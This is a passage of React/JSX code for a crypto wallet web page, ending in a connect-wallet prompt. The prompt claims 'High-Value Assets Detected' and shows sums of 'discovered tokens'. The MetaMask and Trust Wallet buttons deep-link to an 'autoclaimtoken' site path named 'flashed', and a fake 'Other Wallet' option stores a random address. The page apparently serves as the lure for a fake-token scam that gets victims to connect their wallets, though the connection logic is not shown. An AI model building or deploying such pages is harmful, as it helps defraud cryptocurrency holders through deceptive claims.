                    <div className="text-white font-mono text-xs break-all">{selectedToken.contract}</div>
                  </div>
                  
                  <div className="grid grid-cols-3 gap-2">
                    <button 
                      onClick={() => {
                        setShowModal('send');
                      }}
                      className="bg-blue-600 hover:bg-blue-700 py-2 px-3 rounded-lg text-white font-semibold text-sm"
                    >
                      Send
                    </button>
                    <button 
                      onClick={() => {
                        setShowModal('swap');
                      }}
                      className="bg-purple-600 hover:bg-purple-700 py-2 px-3 rounded-lg text-white font-semibold text-sm"
                    >
                      Swap
                    </button>
                    <button 
                      onClick={() => {
                        copyToClipboard(selectedToken.contract);
                        setStatus('Contract address copied!');
                      }}
                      className="bg-gray-600 hover:bg-gray-700 py-2 px-3 rounded-lg text-white font-semibold text-sm"
                    >
                      Copy
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {showModal === 'accountDetails' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Select Account</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-3">
                  {accounts.map(account => (
                    <div 
                      key={account.id} 
                      onClick={() => {
                        if (account.id === 1) {
                          setShowModal(null);
                        } else {
                          setStatus(`Account ${account.id} is empty. Only Account 1 has assets.`);
                          setTimeout(() => setStatus(''), 3000);
                        }
                      }}
                      className="flex items-center justify-between p-3 hover:bg-gray-700 rounded-lg cursor-pointer transition-all"
                    >
                      <div className="flex items-center">
                        <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=${account.address}`} alt={`Account ${account.id}`} className="w-8 h-8 rounded-full mr-3" />
                        <div>
                          <div className="text-white font-medium flex items-center">
                            Account {account.id}
                            {account.isActive && <div className="w-2 h-2 bg-green-400 rounded-full ml-2"></div>}
                          </div>
                          <div className="text-gray-400 text-sm">{account.address.slice(0,10)}...{account.address.slice(-4)}</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white text-sm">${Math.round(account.balance).toLocaleString()}</div>
                        <div className="text-gray-400 text-xs">{account.isActive ? 'Active' : 'Empty'}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {showModal === 'walletOptions' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Connect Wallet</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-3">
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isMetaMask) {
                        connectWallet();
                      } else {
                        window.open('https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <img 
                      src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                      alt="MetaMask" 
                      className="w-8 h-8 mr-3"
                    />
                    <div>
                      <div>MetaMask</div>
                      <div className="text-xs text-orange-200">Most popular wallet</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isTrust) {
                        connectWallet();
                      } else {
                        window.open('https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <img 
                      src="https://trustwallet.com/assets/images/media/assets/TWT.png" 
                      alt="Trust Wallet" 
                      className="w-8 h-8 mr-3 rounded-lg"
                    />
                    <div>
                      <div>Trust Wallet</div>
                      <div className="text-xs text-blue-200">Mobile-first wallet</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isOKExWallet) {
                        connectWallet();
                      } else {
                        window.open('https://www.okx.com/web3', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-green-600 hover:bg-green-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">O</span>
                    </div>
                    <div>
                      <div>OKX Wallet</div>
                      <div className="text-xs text-green-200">Exchange wallet</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isCoinbaseWallet) {
                        connectWallet();
                      } else {
                        window.open('https://www.coinbase.com/wallet', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-indigo-600 hover:bg-indigo-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-indigo-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">C</span>
                    </div>
                    <div>
                      <div>Coinbase Wallet</div>
                      <div className="text-xs text-indigo-200">Beginner friendly</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
                      setUserAddress(mockAddress);
                      setShowModal(null);
                      localStorage.setItem('connectedWallet', mockAddress);
                    }}
                    className="flex items-center w-full bg-gray-600 hover:bg-gray-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-gray-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">+</span>
                    </div>
                    <div>
                      <div>Other Wallet</div>
                      <div className="text-xs text-gray-300">Manual connection</div>
                    </div>
                  </button>
                </div>
                <div className="mt-4 text-center">
                  <p className="text-gray-400 text-sm">Choose your preferred wallet or download one above</p>
                  <p className="text-gray-500 text-xs mt-1">All wallets work with this platform</p>
                </div>
              </div>
            </div>
          )}

          {/* Status Message */}
          {status && (
            <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-gray-800 px-4 py-2 rounded-lg border border-gray-600 z-50">
              <div className="text-center text-sm text-gray-300">{status}</div>
            </div>
          )}

          {/* Connect Wallet Prompt */}
          {!userAddress && !showModal && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4">
                <h3 className="text-white font-bold text-lg mb-4">High-Value Assets Detected</h3>
                <p className="text-gray-300 mb-6">Connect your wallet to access ${Math.round(walletData.totalValue).toLocaleString()} in discovered tokens</p>
                <button 
                  onClick={detectWalletAndRedirect}
                  className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold mb-3"
                >
                  Connect Wallet
                </button>
                <button 
                  onClick={() => setShowModal('walletOptions')}
                  className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
                >
                  More Wallet Options
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </>
  );
}